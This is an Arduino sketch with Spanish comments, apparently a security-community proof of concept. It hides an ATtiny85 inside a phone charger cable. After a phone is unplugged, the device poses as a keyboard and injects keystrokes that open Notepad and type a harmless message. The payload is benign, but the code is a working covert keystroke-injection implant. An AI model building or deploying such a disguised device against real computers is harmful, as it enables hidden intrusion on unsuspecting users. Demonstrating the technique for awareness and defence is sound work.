// POC_bad_USB_cable_charger.ino: prueba de concepto cable cargador de moviles modificado con un Attiny85
//
// CC Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
// https://creativecommons.org/licenses/by-sa/4.0/
// https://euskalhack.org/ 
//
// =============================================================================================             
//                                 Diode LED
//                             +------>|------+
//                             |    R 3k3     |
//                             | +--\/\/\---+ |
//                             | |          | |
//                             | |  +-\/-+  | |
// RESET/ADC0 (D5) PB5     /---+---1|    |8---+ VCC
//  USB- ADC3 (D3) PB3    /  /---+-2|    |7-+   PB2 (D2) SCK/SCL/INT0/ADC1 - default TX Debug output for ATtinySerialOut
//  USB+ ADC2 (D4) PB4   /  /  /---3|    |6     PB1 (D1) MISO/DO/OC0B/OC1A/AIN1/PCINT1 - (Digispark) LED
//                 GND  /  /  /  /-4|    |5     PB0 (D0) MOSI/DI/SDA/OC0A/AIN0
//                     /  /  /  /   +----+
//        USB A(PC)   /  /  /  /   Attiny85               Micro USB (phone)      
//       +--------+  /  /  /  /                           __
// Vcc   | ====== --+--/--/--/---------------------------/  |
// USB+  |   ==== ----+--/--/----------------------------| :|
// USB-  |   ==== ------+--/-----------------------------| :|
// GND   | ====== --------+------------------------------\__|
//       +--------+                                      
//
//
//Explicacion:
//1) dejo pasar las señales USB a través del cable. (patillas usb en alta impedancia)
//2) espero a que se enganche(a) y se desenganche(b) un dispositivo
//3) a los 10seg de la desconexión Inicio teclado y lanzo "Payload" (carga util).
//4) después dejo otra vez el usb libre. (alta impedancia) Y reinicio micro.

//Carga librerias y definion Pins
#include "DigiKeyboard.h"
#define  USB_PullUp 2 //Pin7 Pb2 
#define  USB_P      3 //Pin2 Pb3 USB- A3 
#define  USB_N      4 //Pin3 Pb4 USB+ A2
void(* resetFunc)(void)=0;//declara funcion reset apuntando direccion 0

void setup() {
  
  //1)dejo pasar las señales USB a través del cable.
  pinMode(USB_PullUp,INPUT);   //Pin7 Pb2  alta Impedancia
  pinMode(USB_P,   INPUT);     //Pin2 Pb3 USB- alta Impedancia 
  pinMode(USB_N,   INPUT);     //Pin3 Pb4 USB+ alta Impedancia 
  digitalWrite(USB_PullUp,LOW);//desactivo PullUp
  digitalWrite(USB_P,LOW);     //desactivo PullUp
  digitalWrite(USB_N,LOW);     //desactivo PullUp
  
  //2a) Espero a que se conecte un dispositivo al cable USB
  while( (analogRead(A3)+analogRead(A2)) < 768 ){ delay(900); }

  //2b) Espero a que se DESconecte el dispositivo del cable USB
  int tout = 0; //Minimo 10segundos desconectado.(10seg = 10.000miliSeg)
  while(tout++ < 10000) {
      delay(1);//un milisegundo de retardo
      // si todavia esta conectado el movil reseteo contador tout
      if( (analogRead(A3)+analogRead(A2))/2 > 512 ) tout=0;
  }

  //3a)Inicio teclado
  usbDeviceConnect();
  pinMode(USB_PullUp,OUTPUT);   //Activo resistencia pullUP para que el host
  digitalWrite(USB_PullUp,HIGH);//detecte un dispositivo conectado al USB 
  DigiKeyboard.delay(5);
  DigiKeyboard.sendKeyStroke(0);//evita perdida primer caracter
  
  //3b)lanzo payload 
  DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT); //tecla windows
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("notepad"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);  
  DigiKeyboard.delay(1200);
  DigiKeyboard.println(F("Play with USB devices for Fun!"));
  DigiKeyboard.delay(250);

  //4a) Desconecto USB
  usbDeviceDisconnect();        //desconecto dispositivo
  pinMode(USB_PullUp,INPUT);    //desactivo Resistencia PullUp (Pongo Pin en Alta Impedancia)

  //4b) Reseteo Micro
  resetFunc(); //Reseteo Micro. (tema inicializacion libreria USB)
}

void loop() {}
